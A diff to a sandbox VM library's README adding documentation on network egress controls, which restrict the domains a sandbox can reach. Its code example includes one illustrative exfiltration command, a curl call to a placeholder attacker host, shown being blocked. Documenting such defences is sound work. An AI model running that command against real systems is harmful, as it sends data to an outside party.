@@ -108,6 +108,29 @@ smolvm browser stop sess_a1b2c3
 See [examples/browser_session.py](examples/browser_session.py) for the Python equivalent.
 
 
+## Network controls
+
+By default, sandboxes have full internet access. You can restrict which domains a sandbox can reach by passing `internet_settings`:
+
+```python
+from smolvm import SmolVM
+
+vm = SmolVM(internet_settings={
+    "allowed_domains": ["https://api.openai.com"],
+})
+
+vm.run("curl https://api.openai.com/v1/models")    # allowed
+vm.run("curl https://evil.com/exfiltrate")         # blocked
+```
+
+| Setting | Default | What it does |
+| --- | --- | --- |
+| `allowed_domains` | `["*"]` (all) | List of hostnames the sandbox can reach. Accepts URLs or bare domains. |
+| `allowed_http_methods` | `["*"]` (all) | HTTP methods the sandbox can use. *Not yet enforced — reserved for a future release.* |
+
+Set `allowed_domains` to `["*"]` (or omit `internet_settings` entirely) for unrestricted access. Network controls require the Firecracker backend. See [docs/concepts/network-egress-controls.md](docs/deep-dive/network-egress-controls.md) for how it works under the hood.
+
+
 ## Examples
 
 ### Getting started
